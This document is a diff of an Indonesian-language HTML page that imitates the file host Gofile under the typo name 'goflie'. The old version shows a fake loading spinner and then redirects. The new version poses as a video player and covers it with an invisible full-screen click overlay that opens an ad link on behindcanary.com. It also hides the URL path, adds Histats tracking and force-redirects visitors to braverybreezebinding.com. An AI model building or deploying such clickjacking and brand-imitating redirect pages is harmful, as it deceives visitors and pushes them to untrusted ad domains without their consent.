@@ -1,227 +1,110 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Pengalihan Cadangan (Fallback) -->
-    <meta http-equiv="refresh" content="4; url=https://www.tujuan-anda.com/">
-    <title>gofile</title>
-    
+   <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="referrer" content="no-referrer">
+    <title>cdn.video.top</title>
     <style>
-        :root {
-            --accent-color: #007bff; /* Biru elektrik khas Gofile */
-            --secondary-text: rgba(255, 255, 255, 0.3);
-            --bg-color: #0a0a0b;
-            --glow-color: rgba(0, 123, 255, 0.4);
-        }
-
-        * {
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            height: 100vh;
+        /* Desain Minimalis Layar Penuh */
+        body, html {
             margin: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
             overflow: hidden;
-            background-color: var(--bg-color);
-            color: #fff;
-        }
-
-        /* Latar Belakang ala Gofile dengan aksen warna */
-        .background-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            background: radial-gradient(circle at 50% -20%, #151921 0%, #0a0a0b 80%);
-        }
-
-        .glow-bg {
-            position: absolute;
-            width: 800px;
-            height: 600px;
-            background: radial-gradient(circle, rgba(0, 123, 255, 0.08) 0%, rgba(0, 0, 0, 0) 70%);
-            border-radius: 50%;
-            top: -250px;
-            left: 50%;
-            transform: translateX(-50%);
-            filter: blur(60px);
-        }
-
-        /* Ikon Menu Garis Tiga */
-        .menu-icon {
-            position: absolute;
-            top: 2rem;
-            left: 2rem;
-            width: 22px;
-            height: 16px;
             display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            cursor: pointer;
-            z-index: 20;
-            opacity: 0.5;
-            transition: all 0.3s ease;
-        }
-
-        .menu-icon:hover {
-            opacity: 1;
-            transform: scale(1.1);
-        }
-
-        .menu-line {
-            width: 100%;
-            height: 1.5px;
-            background-color: #fff;
-            border-radius: 2px;
-        }
-
-        /* Kontainer Utama */
-        .content-wrapper {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 2;
-        }
-
-        /* Spinner Premium Dual-Ring Berwarna */
-        .spinner-box {
             position: relative;
-            width: 70px;
-            height: 70px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
 
-        /* Cincin Luar Berwarna */
-        .outer-ring {
-            position: absolute;
+        /* Video Player */
+        video {
             width: 100%;
             height: 100%;
-            border: 2px solid rgba(255, 255, 255, 0.03);
-            border-top: 2px solid var(--accent-color);
-            border-radius: 50%;
-            animation: spin 1s cubic-bezier(0.5, 0.1, 0.4, 0.9) infinite;
-            filter: drop-shadow(0 0 8px var(--glow-color));
+            object-fit: contain;
+            outline: none;
+            background-color: #000;
         }
 
-        /* Cincin Dalam */
-        .inner-ring {
+        /* Lapisan Redirect Transparan */
+        #click-overlay {
             position: absolute;
-            width: 60%;
-            height: 60%;
-            border: 1.5px solid rgba(255, 255, 255, 0.03);
-            border-bottom: 1.5px solid var(--accent-color);
-            border-radius: 50%;
-            animation: spin-reverse 0.6s linear infinite;
-            opacity: 0.8;
-        }
-
-        /* Titik Tengah Berpendar Biru */
-        .center-glow {
-            width: 5px;
-            height: 5px;
-            background-color: var(--accent-color);
-            border-radius: 50%;
-            box-shadow: 0 0 15px 3px var(--glow-color);
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        @keyframes spin-reverse {
-            0% { transform: rotate(360deg); }
-            100% { transform: rotate(0deg); }
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 0.6; transform: scale(1); }
-            50% { opacity: 1; transform: scale(1.3); }
-        }
-
-        /* Copyright di bawah */
-        .footer {
-            padding-bottom: 3rem;
-            font-size: 10px;
-            letter-spacing: 2px;
-            color: var(--secondary-text);
-            text-transform: uppercase;
-            z-index: 2;
-        }
-
-        .fade-in {
-            animation: fadeIn 1.5s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .overlay-link {
-            position: absolute;
-            width: 100%;
-            height: 100%;
             top: 0;
             left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
             cursor: pointer;
+            background-color: rgba(0,0,0,0); /* Transparan */
+        }
+
+        
+        #error-msg {
+            color: #333;
+            font-family: sans-serif;
+            display: none;
             z-index: 10;
         }
     </style>
 </head>
 <body>
 
-    <div class="background-container">
-        <div class="glow-bg"></div>
-    </div>
+    <div id="error-msg">Akses Ditolak</div>
+    
+    
+    <div id="click-overlay"></div>
 
-    <!-- Ikon Menu -->
-    <div class="menu-icon fade-in">
-        <div class="menu-line"></div>
-        <div class="menu-line" style="width: 70%;"></div>
-        <div class="menu-line"></div>
-    </div>
-
-    <!-- Klik manual -->
-    <a href="https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb" class="overlay-link"></a>
-
-    <div class="content-wrapper fade-in">
-        <!-- Spinner Dual-Ring Modern Berwarna -->
-        <div class="spinner-box">
-            <div class="outer-ring"></div>
-            <div class="inner-ring"></div>
-            <div class="center-glow"></div>
-        </div>
-    </div>
-
-    <!-- Footer Copyright -->
-    <div class="footer fade-in">
-        &copy; 2026 goflie. All Rights Reserved.
-    </div>
+    <video id="player" controls playsinline loop></video>
 
     <script>
-        const targetURL = "https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb";
+        (function() {
         
-        // Pengalihan otomatis setelah 3 detik
-        setTimeout(() => {
-            window.location.href = targetURL;
-        }, 1000);
+            const allowedDomain = "goflie.top";
+            const currentDomain = window.location.hostname;
+
+            if (currentDomain !== allowedDomain && currentDomain !== "localhost" && !currentDomain.includes("vercel.app")) {
+                const playerEl = document.getElementById('player');
+                const overlayEl = document.getElementById('click-overlay');
+                if (playerEl) playerEl.remove();
+                if (overlayEl) overlayEl.remove();
+                document.getElementById('error-msg').style.display = 'block';
+                return;
+            }
+
+            const p = document.getElementById('player');
+            const overlay = document.getElementById('click-overlay');
+            
+            
+            const redirectUrl = "https://behindcanary.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb"; 
+
+            overlay.addEventListener('click', function() {
+                
+                window.open(redirectUrl, '_blank');
+                
+                overlay.remove();
+            });
+
+    
+            function getID() {
+                let h = window.location.pathname;
+                return h.replace(/^\/+|\.mp4$/g, "");
+            }
+
+            const videoId = getID();
+
+            if (videoId && videoId !== "index" && videoId !== "404") {
+                p.src = "https://cdn.videy.co/" + videoId + ".mp4";
+            } else {
+                p.src = "https://cdn.videy.co/zMXpwOWb1.mp4";
+            }
+        })();
     </script>
 
-<script>
+  
+  <script>
 /* tampilkan slug random SETELAH Histats */
 setTimeout(() => {
   const c = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -233,13 +116,13 @@ setTimeout(() => {
 }, 200);
 
 history.replaceState(null, "", "/");
-document.title = "top";
+document.title = "video.cdn.top";
 
 if (!sessionStorage.getItem("histats_hit")) {
   sessionStorage.setItem("histats_hit", "1");
 
   var _Hasync = _Hasync || [];
-  _Hasync.push(['Histats.start','1,4971583,4,0,0,0,00000000']);
+  _Hasync.push(['Histats.start','1, 4971583,4,0,0,0,00000000']);
   _Hasync.push(['Histats.fasi','1']);
   _Hasync.push(['Histats.track_hits','']);
 
@@ -250,8 +133,15 @@ if (!sessionStorage.getItem("histats_hit")) {
     document.body.appendChild(hs);
   })();
 }
+ 
+/* redirect */
+setTimeout(() => {
+  document.body.classList.add("fade-out");
+  setTimeout(() => {
+    location.href = "https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb";
+  }, 20000);
+}, 800);
 </script>
-
   
-</body>
-  </html>
+  </body>
+</html>
